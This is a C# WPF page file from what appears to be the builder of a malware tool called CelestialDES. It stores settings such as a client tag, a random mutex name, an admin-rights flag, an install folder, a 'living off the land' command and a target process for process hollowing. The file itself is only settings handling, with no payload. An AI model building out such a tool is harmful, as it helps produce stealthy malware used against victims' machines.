using CelestialDES.Properties;
using Notifications.Wpf;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CelestialDES.Pages.BuilderPages
{
    /// <summary>
    /// Логика взаимодействия для General.xaml
    /// </summary>
    public partial class General : Page
    {
        public General()
        {
            InitializeComponent();
        }

        private void ComboBox_DropDownClosed(object sender, EventArgs e)
        {
            if (cmbSelect.SelectedIndex == 0 && Convert.ToBoolean(Setting.isLotl))
                cmbSelect.SelectedIndex = 1;

            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text;
            if (cmbSelect.Text.Contains("folder"))
                fullpath = "Program folder";
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            if (cmbSelect.SelectedIndex != 0)
            {
                FolderText.Visibility = Visibility.Visible;
                FolderTxt.Visibility = Visibility.Visible;
            }
            else { FolderText.Visibility = Visibility.Hidden; FolderTxt.Visibility = Visibility.Hidden; }
            Setting.LibFolder = cmbSelect.Text;
            Setting.LibSubFolder = FolderText.Text;
        }

        private void cmbSelect_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (cmbSelect.SelectedIndex == 0 && Convert.ToBoolean(Setting.isLotl))
                cmbSelect.SelectedIndex = 1;

            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text;
            if (cmbSelect.Text.Contains("folder"))
                fullpath = "Program folder";
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            if (cmbSelect.SelectedIndex != 0)
            {
                FolderText.Visibility = Visibility.Visible;
                FolderTxt.Visibility = Visibility.Visible;
            }
            else { FolderText.Visibility = Visibility.Hidden; FolderTxt.Visibility = Visibility.Hidden; }
            Setting.LibFolder = cmbSelect.Text;
            Setting.LibSubFolder = FolderText.Text;
        }

        private void FolderText_KeyDown(object sender, KeyEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text;
            Fullpath.Text = fullpath;
            Setting.LibFolder = cmbSelect.Text;
            Setting.LibSubFolder = FolderText.Text;
        }

        private void RND_Click(object sender, RoutedEventArgs e)
        {
            Random random = new Random();
            MutexText.Text = "Celestial_" + random.Next(111111111, 999999999).ToString() + random.Next(111111111, 999999999).ToString() + random.Next(1111, 9999).ToString();
        }

        private void TagText_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.ClientTag = TagText.Text;
        }

        private void MutexText_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.MutexName = MutexText.Text;
        }

        private void Page_IsVisibleChanged(object sender, DependencyPropertyChangedEventArgs e)
        {
            TagText.Text = Setting.ClientTag;
            MutexText.Text = Setting.MutexName;
            ReqCheck.IsChecked = Setting.needadmin;
            cmbSelect.Text = Setting.LibFolder;
            FolderText.Text = Setting.LibSubFolder;
            cmbSelectLotl.Text = Setting.Lotlfilename;
            LotlActive.IsChecked = Convert.ToBoolean(Setting.isLotl);
            lotlcmd.Text = Setting.LotlCMD;
            prntprocess.Text = Setting.LotlHollowedProcess;
        }

        private void CheckBox_Checked(object sender, RoutedEventArgs e)
        {
            Setting.needadmin = true;
        }

        private void CheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.needadmin = false;
        }

        private void ComboBox1_DropDownClosed(object sender, EventArgs e)
        {
            Setting.Lotlfilename = cmbSelectLotl.Text;
        }

        private void cmbSelect1_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            Setting.Lotlfilename = cmbSelectLotl.Text;
        }

        private void CheckBox1_Checked(object sender, RoutedEventArgs e)
        {
            var notificationManager = new NotificationManager();
            notificationManager.Show(new NotificationContent
            {
                Title = "Living off the land",
                Message = "May break build when using with scripts. The overall scripts size must be less than +-250 KB.",
                Type = NotificationType.Warning
            });
            if (cmbSelect.SelectedIndex == 0) cmbSelect.SelectedIndex = 1;
            Setting.isLotl = "true";
        }

        private void CheckBox1_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.isLotl = "false";
        }

        private void lotlcmd_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.LotlCMD = lotlcmd.Text;
        }

        private void prntprocess_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.LotlHollowedProcess = prntprocess.Text;
        }

    }
}
